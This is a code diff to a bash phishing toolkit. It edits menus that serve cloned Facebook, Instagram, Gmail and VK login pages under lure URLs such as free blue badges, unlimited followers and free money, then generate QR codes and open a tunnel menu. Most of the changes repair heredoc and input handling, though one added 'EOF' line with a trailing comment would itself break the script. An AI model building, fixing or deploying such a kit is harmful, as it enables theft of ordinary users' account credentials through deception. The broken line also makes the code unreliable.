@@ -518,18 +518,17 @@ custom_url() {
     echo -e "${GREEN}shortened_qr.png"
 EOF
 }
-
-site_facebook() {
+site_facebook()  {
     cat <<- EOF
         ${RED}[${WHITE}01${RED}]${ORANGE} Facebook Login Page
         ${RED}[${WHITE}02${RED}]${ORANGE} Advanced Facebook Page
         ${RED}[${WHITE}03${RED}]${ORANGE} Facebook Security Page
         ${RED}[${WHITE}04${RED}]${ORANGE} Facebook Messenger Page
-    EOF
+EOF
 
-    read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+    read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}" option
 
-    case $REPLY in 
+    case $option in 
         1 | 01)
             website="facebook"
             mask='https://blue-verified-badge-for-facebook-free'
@@ -547,24 +546,30 @@ site_facebook() {
             mask='https://get-messenger-premium-features-free'
             ;;
         *)
-            echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-            { sleep 1; clear; banner_small; site_facebook; };;
+            echo -e "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+            sleep 1
+            clear
+            banner_small
+            site_facebook
+            return
+            ;;
     esac
-    generate_qr "$mask"  # Add this line
+    generate_qr "$mask"
     tunnel_menu
 }
 
-site_instagram()    {
+
+site_instagram() {
     cat <<- EOF
         ${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
         ${RED}[${WHITE}02${RED}]${ORANGE} Auto Followers Login Page
         ${RED}[${WHITE}03${RED}]${ORANGE} 1000 Followers Login Page
         ${RED}[${WHITE}04${RED}]${ORANGE} Blue Badge Verify Login Page
-    EOF
+EOF
 
-    read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+    read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}" option
 
-    case $REPLY in 
+    case $option in 
         1 | 01)
             website="instagram"
             mask='https://get-unlimited-followers-for-instagram'
@@ -585,21 +590,20 @@ site_instagram()    {
             echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
             { sleep 1; clear; banner_small; site_instagram; };;
     esac
-    generate_qr "$mask"  # Add this line
+    generate_qr "$mask"
     tunnel_menu
 }
-
 
 site_gmail() {
     cat <<- EOF
         ${RED}[${WHITE}01${RED}]${ORANGE} Gmail Old Login Page
         ${RED}[${WHITE}02${RED}]${ORANGE} Gmail New Login Page
         ${RED}[${WHITE}03${RED}]${ORANGE} Advanced Voting Poll
-    EOF
+EOF
 
-    read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+    read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}" option
 
-    case $REPLY in 
+    case $option in 
         1 | 01)
             website="google"
             mask='https://get-unlimited-google-drive-free'
@@ -616,21 +620,19 @@ site_gmail() {
             echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
             { sleep 1; clear; banner_small; site_gmail; };;
     esac
-    generate_qr "$mask"  # Add this line
+    generate_qr "$mask"
     tunnel_menu
 }
-## Vk
+
 site_vk() {
     cat <<- EOF
-
         ${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
         ${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page
+EOF
 
-    EOF
+    read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}" option
 
-    read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
-
-    case $REPLY in 
+    case $option in 
         1 | 01)
             website="vk"
             mask='https://vk-premium-real-method-2020'
@@ -644,9 +646,10 @@ site_vk() {
             { sleep 1; clear; banner_small; site_vk; };;
     esac
 
-    generate_qr "$mask" "vk_qr.png"  # Generate QR code and save to vk_qr.png
-    tunnel_menu  # Proceed to the next menu
+    generate_qr "$mask" "vk_qr.png"
+    tunnel_menu
 }
+
 
 
 ## Menu
@@ -669,9 +672,8 @@ main_menu() {
         ${RED}[${WHITE}34${RED}]${ORANGE} Discord       ${RED}[${WHITE}35${RED}]${ORANGE} Roblox 
 
         ${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit
+EOF  # Properly closed EOF
 
-    EOF
-    
     read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
 
     case $REPLY in 
@@ -768,7 +770,9 @@ main_menu() {
             mask='https://get-stackoverflow-lifetime-pro-membership-free'
             ;;
         29)
-            site_vk;;
+            site_vk  # Generate QR inside the VK function
+            return
+            ;;
         30)
             website="xbox"
             mask='https://get-500-usd-free-to-your-acount'
